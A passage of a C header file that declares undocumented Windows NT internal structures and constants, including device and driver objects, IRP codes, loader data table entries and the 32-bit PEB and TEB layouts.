#define FILE_DEVICE_SERENUM             0x00000037
#define FILE_DEVICE_TERMSRV             0x00000038
#define FILE_DEVICE_KSEC                0x00000039
#define FILE_DEVICE_FIPS                0x0000003A
#define FILE_DEVICE_INFINIBAND          0x0000003B
#define FILE_DEVICE_VMBUS               0x0000003E
#define FILE_DEVICE_CRYPT_PROVIDER      0x0000003F
#define FILE_DEVICE_WPD                 0x00000040
#define FILE_DEVICE_BLUETOOTH           0x00000041
#define FILE_DEVICE_MT_COMPOSITE        0x00000042
#define FILE_DEVICE_MT_TRANSPORT        0x00000043
#define FILE_DEVICE_BIOMETRIC           0x00000044
#define FILE_DEVICE_PMI                 0x00000045
#define FILE_DEVICE_EHSTOR              0x00000046
#define FILE_DEVICE_DEVAPI              0x00000047
#define FILE_DEVICE_GPIO                0x00000048
#define FILE_DEVICE_USBEX               0x00000049
#define FILE_DEVICE_CONSOLE             0x00000050
#define FILE_DEVICE_NFP                 0x00000051
#define FILE_DEVICE_SYSENV              0x00000052
#define FILE_DEVICE_VIRTUAL_BLOCK       0x00000053
#define FILE_DEVICE_POINT_OF_SERVICE    0x00000054

#define FILE_BYTE_ALIGNMENT             0x00000000
#define FILE_WORD_ALIGNMENT             0x00000001
#define FILE_LONG_ALIGNMENT             0x00000003
#define FILE_QUAD_ALIGNMENT             0x00000007
#define FILE_OCTA_ALIGNMENT             0x0000000f
#define FILE_32_BYTE_ALIGNMENT          0x0000001f
#define FILE_64_BYTE_ALIGNMENT          0x0000003f
#define FILE_128_BYTE_ALIGNMENT         0x0000007f
#define FILE_256_BYTE_ALIGNMENT         0x000000ff
#define FILE_512_BYTE_ALIGNMENT         0x000001ff

#define DPC_NORMAL 0
#define DPC_THREADED 1

typedef struct _DEVICE_OBJECT {
    CSHORT                      Type;
    USHORT                      Size;
    LONG                        ReferenceCount;
    struct _DRIVER_OBJECT  *DriverObject;
    struct _DEVICE_OBJECT  *NextDevice;
    struct _DEVICE_OBJECT  *AttachedDevice;
    struct _IRP            *CurrentIrp;
    PVOID		                Timer;
    ULONG                       Flags;
    ULONG                       Characteristics;
    __volatile PVPB             Vpb;
    PVOID                       DeviceExtension;
    DEVICE_TYPE                 DeviceType;
    CCHAR                       StackSize;
    union {
        LIST_ENTRY         ListEntry;
        WAIT_CONTEXT_BLOCK Wcb;
    } Queue;
    ULONG                       AlignmentRequirement;
    KDEVICE_QUEUE               DeviceQueue;
    KDPC                        Dpc;
    ULONG                       ActiveThreadCount;
    PSECURITY_DESCRIPTOR        SecurityDescriptor;
    KEVENT                      DeviceLock;
    USHORT                      SectorSize;
    USHORT                      Spare1;
    struct _DEVOBJ_EXTENSION  *  DeviceObjectExtension;
    PVOID                       Reserved;
} DEVICE_OBJECT, *PDEVICE_OBJECT;

typedef struct _DEVOBJ_EXTENSION {

    CSHORT          Type;
    USHORT          Size;

    //
    // Public part of the DeviceObjectExtension structure
    //

    PDEVICE_OBJECT  DeviceObject;               // owning device object

    // end_ntddk end_nthal end_ntifs end_wdm end_ntosp

    //
    // Universal Power Data - all device objects must have this
    //

    ULONG           PowerFlags;             // see ntos\po\pop.h
    // WARNING: Access via PO macros
    // and with PO locking rules ONLY.

    //
    // Pointer to the non-universal power data
    //  Power data that only some device objects need is stored in the
    //  device object power extension -> DOPE
    //  see po.h
    //

    struct          _DEVICE_OBJECT_POWER_EXTENSION  *Dope;

    //
    // power state information
    //

    //
    // Device object extension flags.  Protected by the IopDatabaseLock.
    //

    ULONG ExtensionFlags;

    //
    // PnP manager fields
    //

    PVOID           DeviceNode;

    //
    // AttachedTo is a pointer to the device object that this device
    // object is attached to.  The attachment chain is now doubly
    // linked: this pointer and DeviceObject->AttachedDevice provide the
    // linkage.
    //

    PDEVICE_OBJECT  AttachedTo;

    //
    // The next two fields are used to prevent recursion in IoStartNextPacket
    // interfaces.
    //

    LONG           StartIoCount;       // Used to keep track of number of pending start ios.
    LONG           StartIoKey;         // Next startio key
    ULONG          StartIoFlags;       // Start Io Flags. Need a separate flag so that it can be accessed without locks
    PVPB           Vpb;                // If not NULL contains the VPB of the mounted volume.
    // Set in the filesystem's volume device object.
    // This is a reverse VPB pointer.

    // begin_ntddk begin_wdm begin_nthal begin_ntifs begin_ntosp

} DEVOBJ_EXTENSION, *PDEVOBJ_EXTENSION;

typedef struct _FAST_IO_DISPATCH {
    ULONG SizeOfFastIoDispatch;
    PVOID FastIoCheckIfPossible;
    PVOID FastIoRead;
    PVOID FastIoWrite;
    PVOID FastIoQueryBasicInfo;
    PVOID FastIoQueryStandardInfo;
    PVOID FastIoLock;
    PVOID FastIoUnlockSingle;
    PVOID FastIoUnlockAll;
    PVOID FastIoUnlockAllByKey;
    PVOID FastIoDeviceControl;
    PVOID AcquireFileForNtCreateSection;
    PVOID ReleaseFileForNtCreateSection;
    PVOID FastIoDetachDevice;
    PVOID FastIoQueryNetworkOpenInfo;
    PVOID AcquireForModWrite;
    PVOID MdlRead;
    PVOID MdlReadComplete;
    PVOID PrepareMdlWrite;
    PVOID MdlWriteComplete;
    PVOID FastIoReadCompressed;
    PVOID FastIoWriteCompressed;
    PVOID MdlReadCompleteCompressed;
    PVOID MdlWriteCompleteCompressed;
    PVOID FastIoQueryOpen;
    PVOID ReleaseForModWrite;
    PVOID AcquireForCcFlush;
    PVOID ReleaseForCcFlush;
} FAST_IO_DISPATCH, *PFAST_IO_DISPATCH;

#define IO_TYPE_ADAPTER                 0x00000001
#define IO_TYPE_CONTROLLER              0x00000002
#define IO_TYPE_DEVICE                  0x00000003
#define IO_TYPE_DRIVER                  0x00000004
#define IO_TYPE_FILE                    0x00000005
#define IO_TYPE_IRP                     0x00000006
#define IO_TYPE_MASTER_ADAPTER          0x00000007
#define IO_TYPE_OPEN_PACKET             0x00000008
#define IO_TYPE_TIMER                   0x00000009
#define IO_TYPE_VPB                     0x0000000a
#define IO_TYPE_ERROR_LOG               0x0000000b
#define IO_TYPE_ERROR_MESSAGE           0x0000000c
#define IO_TYPE_DEVICE_OBJECT_EXTENSION 0x0000000d

#define IRP_MJ_CREATE                   0x00
#define IRP_MJ_CREATE_NAMED_PIPE        0x01
#define IRP_MJ_CLOSE                    0x02
#define IRP_MJ_READ                     0x03
#define IRP_MJ_WRITE                    0x04
#define IRP_MJ_QUERY_INFORMATION        0x05
#define IRP_MJ_SET_INFORMATION          0x06
#define IRP_MJ_QUERY_EA                 0x07
#define IRP_MJ_SET_EA                   0x08
#define IRP_MJ_FLUSH_BUFFERS            0x09
#define IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a
#define IRP_MJ_SET_VOLUME_INFORMATION   0x0b
#define IRP_MJ_DIRECTORY_CONTROL        0x0c
#define IRP_MJ_FILE_SYSTEM_CONTROL      0x0d
#define IRP_MJ_DEVICE_CONTROL           0x0e
#define IRP_MJ_INTERNAL_DEVICE_CONTROL  0x0f
#define IRP_MJ_SHUTDOWN                 0x10
#define IRP_MJ_LOCK_CONTROL             0x11
#define IRP_MJ_CLEANUP                  0x12
#define IRP_MJ_CREATE_MAILSLOT          0x13
#define IRP_MJ_QUERY_SECURITY           0x14
#define IRP_MJ_SET_SECURITY             0x15
#define IRP_MJ_POWER                    0x16
#define IRP_MJ_SYSTEM_CONTROL           0x17
#define IRP_MJ_DEVICE_CHANGE            0x18
#define IRP_MJ_QUERY_QUOTA              0x19
#define IRP_MJ_SET_QUOTA                0x1a
#define IRP_MJ_PNP                      0x1b
#define IRP_MJ_PNP_POWER                IRP_MJ_PNP      
#define IRP_MJ_MAXIMUM_FUNCTION         0x1b

typedef struct _DRIVER_EXTENSION {

    //
    // Back pointer to Driver Object
    //

    struct _DRIVER_OBJECT *DriverObject;

    //
    // The AddDevice entry point is called by the Plug & Play manager
    // to inform the driver when a new device instance arrives that this
    // driver must control.
    //

    PVOID AddDevice;

    //
    // The count field is used to count the number of times the driver has
    // had its registered reinitialization routine invoked.
    //

    ULONG Count;

    //
    // The service name field is used by the pnp manager to determine
    // where the driver related info is stored in the registry.
    //

    UNICODE_STRING ServiceKeyName;

} DRIVER_EXTENSION, *PDRIVER_EXTENSION;

#define DRVO_UNLOAD_INVOKED             0x00000001
#define DRVO_LEGACY_DRIVER              0x00000002
#define DRVO_BUILTIN_DRIVER             0x00000004    // Driver objects for Hal, PnP Mgr
#define DRVO_REINIT_REGISTERED          0x00000008
#define DRVO_INITIALIZED                0x00000010
#define DRVO_BOOTREINIT_REGISTERED      0x00000020
#define DRVO_LEGACY_RESOURCES           0x00000040
// end_ntddk end_nthal end_ntifs end_ntosp
#define DRVO_BASE_FILESYSTEM_DRIVER     0x00000080   // A driver that is at the bottom of the filesystem stack.
// begin_ntddk begin_nthal begin_ntifs begin_ntosp

typedef struct _DRIVER_OBJECT {
    CSHORT Type;
    CSHORT Size;

    //
    // The following links all of the devices created by a single driver
    // together on a list, and the Flags word provides an extensible flag
    // location for driver objects.
    //

    PDEVICE_OBJECT DeviceObject;
    ULONG Flags;

    //
    // The following section describes where the driver is loaded.  The count
    // field is used to count the number of times the driver has had its
    // registered reinitialization routine invoked.
    //

    PVOID DriverStart;
    ULONG DriverSize;
    PVOID DriverSection; //PLDR_DATA_TABLE_ENTRY
    PDRIVER_EXTENSION DriverExtension;

    //
    // The driver name field is used by the error log thread
    // determine the name of the driver that an I/O request is/was bound.
    //

    UNICODE_STRING DriverName;

    //
    // The following section is for registry support.  Thise is a pointer
    // to the path to the hardware information in the registry
    //

    PUNICODE_STRING HardwareDatabase;

    //
    // The following section contains the optional pointer to an array of
    // alternate entry points to a driver for "fast I/O" support.  Fast I/O
    // is performed by invoking the driver routine directly with separate
    // parameters, rather than using the standard IRP call mechanism.  Note
    // that these functions may only be used for synchronous I/O, and when
    // the file is cached.
    //

    PFAST_IO_DISPATCH FastIoDispatch;

    //
    // The following section describes the entry points to this particular
    // driver.  Note that the major function dispatch table must be the last
    // field in the object so that it remains extensible.
    //

    PVOID DriverInit;
    PVOID DriverStartIo;
    PVOID DriverUnload;
    PVOID MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];

} DRIVER_OBJECT;
typedef struct _DRIVER_OBJECT *PDRIVER_OBJECT;

#define RESOURCE_TYPE_LEVEL     0
#define RESOURCE_NAME_LEVEL     1
#define RESOURCE_LANGUAGE_LEVEL 2
#define RESOURCE_DATA_LEVEL     3

typedef struct _LDR_RESOURCE_INFO {
    ULONG_PTR Type;
    ULONG_PTR Name;
    ULONG Lang;
} LDR_RESOURCE_INFO, *PLDR_RESOURCE_INFO;

typedef struct _LDR_DATA_TABLE_ENTRY_COMPATIBLE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    } DUMMYUNION0;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1; // Size=4 Offset=104 BitOffset=0 BitCount=1
            ULONG MarkedForRemoval : 1; // Size=4 Offset=104 BitOffset=1 BitCount=1
            ULONG ImageDll : 1; // Size=4 Offset=104 BitOffset=2 BitCount=1
            ULONG LoadNotificationsSent : 1; // Size=4 Offset=104 BitOffset=3 BitCount=1
            ULONG TelemetryEntryProcessed : 1; // Size=4 Offset=104 BitOffset=4 BitCount=1
            ULONG ProcessStaticImport : 1; // Size=4 Offset=104 BitOffset=5 BitCount=1
            ULONG InLegacyLists : 1; // Size=4 Offset=104 BitOffset=6 BitCount=1
            ULONG InIndexes : 1; // Size=4 Offset=104 BitOffset=7 BitCount=1
            ULONG ShimDll : 1; // Size=4 Offset=104 BitOffset=8 BitCount=1
            ULONG InExceptionTable : 1; // Size=4 Offset=104 BitOffset=9 BitCount=1
            ULONG ReservedFlags1 : 2; // Size=4 Offset=104 BitOffset=10 BitCount=2
            ULONG LoadInProgress : 1; // Size=4 Offset=104 BitOffset=12 BitCount=1
            ULONG LoadConfigProcessed : 1; // Size=4 Offset=104 BitOffset=13 BitCount=1
            ULONG EntryProcessed : 1; // Size=4 Offset=104 BitOffset=14 BitCount=1
            ULONG ProtectDelayLoad : 1; // Size=4 Offset=104 BitOffset=15 BitCount=1
            ULONG ReservedFlags3 : 2; // Size=4 Offset=104 BitOffset=16 BitCount=2
            ULONG DontCallForThreads : 1; // Size=4 Offset=104 BitOffset=18 BitCount=1
            ULONG ProcessAttachCalled : 1; // Size=4 Offset=104 BitOffset=19 BitCount=1
            ULONG ProcessAttachFailed : 1; // Size=4 Offset=104 BitOffset=20 BitCount=1
            ULONG CorDeferredValidate : 1; // Size=4 Offset=104 BitOffset=21 BitCount=1
            ULONG CorImage : 1; // Size=4 Offset=104 BitOffset=22 BitCount=1
            ULONG DontRelocate : 1; // Size=4 Offset=104 BitOffset=23 BitCount=1
            ULONG CorILOnly : 1; // Size=4 Offset=104 BitOffset=24 BitCount=1
            ULONG ChpeImage : 1; // Size=4 Offset=104 BitOffset=25 BitCount=1
            ULONG ReservedFlags5 : 2; // Size=4 Offset=104 BitOffset=26 BitCount=2
            ULONG Redirected : 1; // Size=4 Offset=104 BitOffset=28 BitCount=1
            ULONG ReservedFlags6 : 2; // Size=4 Offset=104 BitOffset=29 BitCount=2
            ULONG CompatDatabaseProcessed : 1; // Size=4 Offset=104 BitOffset=31 BitCount=1
        };
    } ENTRYFLAGSUNION;
    WORD ObsoleteLoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    } DUMMYUNION1;
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    } DUMMYUNION2;
    //fields below removed for compatibility
} LDR_DATA_TABLE_ENTRY_COMPATIBLE, *PLDR_DATA_TABLE_ENTRY_COMPATIBLE;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE *PLDR_DATA_TABLE_ENTRY;
typedef LDR_DATA_TABLE_ENTRY *PCLDR_DATA_TABLE_ENTRY;

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG Flags;                    //Reserved.
    PCUNICODE_STRING FullDllName;   //The full path name of the DLL module.
    PCUNICODE_STRING BaseDllName;   //The base file name of the DLL module.
    PVOID DllBase;                  //A pointer to the base address for the DLL in memory.
    ULONG SizeOfImage;              //The size of the DLL image, in bytes.
} LDR_DLL_LOADED_NOTIFICATION_DATA, *PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA {
    ULONG Flags;                    //Reserved.
    PCUNICODE_STRING FullDllName;   //The full path name of the DLL module.
    PCUNICODE_STRING BaseDllName;   //The base file name of the DLL module.
    PVOID DllBase;                  //A pointer to the base address for the DLL in memory.
    ULONG SizeOfImage;              //The size of the DLL image, in bytes.
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, *PLDR_DLL_UNLOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA {
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
    LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;
typedef const LDR_DLL_NOTIFICATION_DATA *PCLDR_DLL_NOTIFICATION_DATA;

#define LDR_DLL_NOTIFICATION_REASON_LOADED   1
#define LDR_DLL_NOTIFICATION_REASON_UNLOADED 2

typedef enum _LDR_DLL_LOAD_REASON {
    LoadReasonStaticDependency,
    LoadReasonStaticForwarderDependency,
    LoadReasonDynamicForwarderDependency,
    LoadReasonDelayloadDependency,
    LoadReasonDynamicLoad,
    LoadReasonAsImageLoad,
    LoadReasonAsDataLoad,
    LoadReasonEnclavePrimary,
    LoadReasonEnclaveDependency,
    LoadReasonUnknown = -1
} LDR_DLL_LOAD_REASON, *PLDR_DLL_LOAD_REASON;

/*
* WDM END
*/

/*
*  NTQSI Modules START
*/

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULE_INFORMATION_EX {
    USHORT NextOffset;
    RTL_PROCESS_MODULE_INFORMATION BaseInfo;
    ULONG ImageChecksum;
    ULONG TimeDateStamp;
    PVOID DefaultBase;
} RTL_PROCESS_MODULE_INFORMATION_EX, *PRTL_PROCESS_MODULE_INFORMATION_EX;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

/*
*	NTQSI Modules END
*/

/*
** Virtual Memory START
*/

typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation,
    MemoryWorkingSetInformation,
    MemoryMappedFilenameInformation,
    MemoryRegionInformation,
    MemoryWorkingSetExInformation,
    MemorySharedCommitInformation,
    MemoryImageInformation,
    MemoryRegionInformationEx,
    MemoryPrivilegedBasicInformation,
    MemoryEnclaveImageInformation,
    MemoryBasicInformationCapped
} MEMORY_INFORMATION_CLASS, *PMEMORY_INFORMATION_CLASS;

typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS {
    VmPrefetchInformation,
    VmPagePriorityInformation,
    VmCfgCallTargetInformation,
    VmPageDirtyStateInformation
} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct _MEMORY_REGION_INFORMATION {
    PVOID AllocationBase;
    ULONG AllocationProtect;
    union
    {
        ULONG RegionType;
        struct
        {
            ULONG Private : 1;
            ULONG MappedDataFile : 1;
            ULONG MappedImage : 1;
            ULONG MappedPageFile : 1;
            ULONG MappedPhysical : 1;
            ULONG DirectMapped : 1;
            ULONG SoftwareEnclave : 1;
            ULONG PageSize64K : 1;
            ULONG Reserved : 24;
        };
    };
    SIZE_T RegionSize;
    //SIZE_T CommitSize;
} MEMORY_REGION_INFORMATION, *PMEMORY_REGION_INFORMATION;

typedef struct _MEMORY_RANGE_ENTRY {
    PVOID VirtualAddress;
    SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY, *PMEMORY_RANGE_ENTRY;

/*
** Virtual Memory END
*/

/*
** System Firmware START
*/

typedef enum _SYSTEM_FIRMWARE_TABLE_ACTION {
    SystemFirmwareTable_Enumerate,
    SystemFirmwareTable_Get,
    SystemFirmwareTableMax
} SYSTEM_FIRMWARE_TABLE_ACTION, *PSYSTEM_FIRMWARE_TABLE_ACTION;

typedef struct _SYSTEM_FIRMWARE_TABLE_INFORMATION {
    ULONG ProviderSignature;
    SYSTEM_FIRMWARE_TABLE_ACTION Action;
    ULONG TableID;
    ULONG TableBufferLength;
    UCHAR TableBuffer[ANYSIZE_ARRAY];
} SYSTEM_FIRMWARE_TABLE_INFORMATION, *PSYSTEM_FIRMWARE_TABLE_INFORMATION;

/*
** System Firmware END
*/

//
//  PEB/TEB
//
#define GDI_HANDLE_BUFFER_SIZE32  34
#define GDI_HANDLE_BUFFER_SIZE64  60

#if !defined(_M_X64)
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32
#else
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64
#endif

typedef ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];
typedef ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];
typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];

#define RTL_MAX_DRIVE_LETTERS 32
#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001

#define GDI_MAX_HANDLE_COUNT 0x4000

// 32-bit definitions
typedef struct _STRING32 {
    USHORT Length;
    USHORT MaximumLength;
    ULONG Buffer;
} STRING32;
typedef STRING32 *PSTRING32;

typedef STRING32 UNICODE_STRING32;

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef struct LIST_ENTRY32 {
    DWORD Flink;
    DWORD Blink;
} LIST_ENTRY32;
typedef LIST_ENTRY32 *PLIST_ENTRY32;

typedef struct LIST_ENTRY64 {
    ULONGLONG Flink;
    ULONGLONG Blink;
} LIST_ENTRY64;
typedef LIST_ENTRY64 *PLIST_ENTRY64;
#endif

#define WOW64_POINTER(Type) ULONG

typedef struct _PEB_LDR_DATA32 {
    ULONG Length;
    BOOLEAN Initialized;
    WOW64_POINTER(HANDLE) SsHandle;
    LIST_ENTRY32 InLoadOrderModuleList;
    LIST_ENTRY32 InMemoryOrderModuleList;
    LIST_ENTRY32 InInitializationOrderModuleList;
    WOW64_POINTER(PVOID) EntryInProgress;
    BOOLEAN ShutdownInProgress;
    WOW64_POINTER(HANDLE) ShutdownThreadId;
} PEB_LDR_DATA32, *PPEB_LDR_DATA32;

#define LDR_DATA_TABLE_ENTRY_SIZE_WINXP32 FIELD_OFFSET( LDR_DATA_TABLE_ENTRY32, ForwarderLinks )

typedef struct _LDR_DATA_TABLE_ENTRY32 {
    LIST_ENTRY32 InLoadOrderLinks;
    LIST_ENTRY32 InMemoryOrderLinks;
    LIST_ENTRY32 InInitializationOrderLinks;
    WOW64_POINTER(PVOID) DllBase;
    WOW64_POINTER(PVOID) EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING32 FullDllName;
    UNICODE_STRING32 BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union
    {
        LIST_ENTRY32 HashLinks;
        struct
        {
            WOW64_POINTER(PVOID) SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        WOW64_POINTER(PVOID) LoadedImports;
    };
    WOW64_POINTER(PVOID) EntryPointActivationContext;
    WOW64_POINTER(PVOID) PatchInformation;
    LIST_ENTRY32 ForwarderLinks;
    LIST_ENTRY32 ServiceTagLinks;
    LIST_ENTRY32 StaticLinks;
    WOW64_POINTER(PVOID) ContextInformation;
    WOW64_POINTER(ULONG_PTR) OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;

typedef struct _CURDIR32 {
    UNICODE_STRING32 DosPath;
    WOW64_POINTER(HANDLE) Handle;
} CURDIR32, *PCURDIR32;

typedef struct _RTL_DRIVE_LETTER_CURDIR32 {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING32 DosPath;
} RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32;

typedef struct _RTL_USER_PROCESS_PARAMETERS32 {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    WOW64_POINTER(HANDLE) ConsoleHandle;
    ULONG ConsoleFlags;
    WOW64_POINTER(HANDLE) StandardInput;
    WOW64_POINTER(HANDLE) StandardOutput;
    WOW64_POINTER(HANDLE) StandardError;

    CURDIR32 CurrentDirectory;
    UNICODE_STRING32 DllPath;
    UNICODE_STRING32 ImagePathName;
    UNICODE_STRING32 CommandLine;
    WOW64_POINTER(PVOID) Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING32 WindowTitle;
    UNICODE_STRING32 DesktopInfo;
    UNICODE_STRING32 ShellInfo;
    UNICODE_STRING32 RuntimeData;
    RTL_DRIVE_LETTER_CURDIR32 CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
} RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32;

typedef struct _PEB32 {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    WOW64_POINTER(HANDLE) Mutant;

    WOW64_POINTER(PVOID) ImageBaseAddress;
    WOW64_POINTER(PPEB_LDR_DATA) Ldr;
    WOW64_POINTER(PRTL_USER_PROCESS_PARAMETERS) ProcessParameters;
    WOW64_POINTER(PVOID) SubSystemData;
    WOW64_POINTER(PVOID) ProcessHeap;
    WOW64_POINTER(PRTL_CRITICAL_SECTION) FastPebLock;
    WOW64_POINTER(PVOID) AtlThunkSListPtr;
    WOW64_POINTER(PVOID) IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ReservedBits0 : 25;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        WOW64_POINTER(PVOID) KernelCallbackTable;
        WOW64_POINTER(PVOID) UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    WOW64_POINTER(PVOID) ApiSetMap;
    ULONG TlsExpansionCounter;
    WOW64_POINTER(PVOID) TlsBitmap;
    ULONG TlsBitmapBits[2];
    WOW64_POINTER(PVOID) ReadOnlySharedMemoryBase;
    WOW64_POINTER(PVOID) HotpatchInformation;
    WOW64_POINTER(PPVOID) ReadOnlyStaticServerData;
    WOW64_POINTER(PVOID) AnsiCodePageData;
    WOW64_POINTER(PVOID) OemCodePageData;
    WOW64_POINTER(PVOID) UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    WOW64_POINTER(SIZE_T) HeapSegmentReserve;
    WOW64_POINTER(SIZE_T) HeapSegmentCommit;
    WOW64_POINTER(SIZE_T) HeapDeCommitTotalFreeThreshold;
    WOW64_POINTER(SIZE_T) HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    WOW64_POINTER(PPVOID) ProcessHeaps;

    WOW64_POINTER(PVOID) GdiSharedHandleTable;
    WOW64_POINTER(PVOID) ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    WOW64_POINTER(PRTL_CRITICAL_SECTION) LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    WOW64_POINTER(ULONG_PTR) ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER32 GdiHandleBuffer;
    WOW64_POINTER(PVOID) PostProcessInitRoutine;

    WOW64_POINTER(PVOID) TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    // Rest of structure not included.
} PEB32, *PPEB32;

#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH32 {
    ULONG Offset;
    WOW64_POINTER(ULONG_PTR) HDC;
    ULONG Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH32, *PGDI_TEB_BATCH32;

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
//
// 32 and 64 bit specific version for wow64 and the debugger
//
typedef struct _NT_TIB32 {
    DWORD ExceptionList;
    DWORD StackBase;
    DWORD StackLimit;
    DWORD SubSystemTib;
    union {
        DWORD FiberData;
        DWORD Version;
    };
    DWORD ArbitraryUserPointer;
    DWORD Self;
} NT_TIB32, *PNT_TIB32;

typedef struct _NT_TIB64 {
    DWORD64 ExceptionList;
    DWORD64 StackBase;
    DWORD64 StackLimit;
    DWORD64 SubSystemTib;
    union {
        DWORD64 FiberData;
        DWORD Version;
    };
    DWORD64 ArbitraryUserPointer;
    DWORD64 Self;
} NT_TIB64, *PNT_TIB64;
#endif

typedef struct _TEB32 {
    NT_TIB32 NtTib;

    WOW64_POINTER(PVOID) EnvironmentPointer;
    CLIENT_ID32 ClientId;
    WOW64_POINTER(PVOID) ActiveRpcHandle;
    WOW64_POINTER(PVOID) ThreadLocalStoragePointer;
    WOW64_POINTER(PPEB) ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    WOW64_POINTER(PVOID) CsrClientThread;
    WOW64_POINTER(PVOID) Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    WOW64_POINTER(PVOID) WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    WOW64_POINTER(PVOID) SystemReserved1[54];
    NTSTATUS ExceptionCode;
    WOW64_POINTER(PVOID) ActivationContextStackPointer;
    BYTE SpareBytes[36];
    ULONG TxFsContext;

    GDI_TEB_BATCH32 GdiTebBatch;
    CLIENT_ID32 RealClientId;
    WOW64_POINTER(HANDLE) GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    WOW64_POINTER(PVOID) GdiThreadLocalInfo;
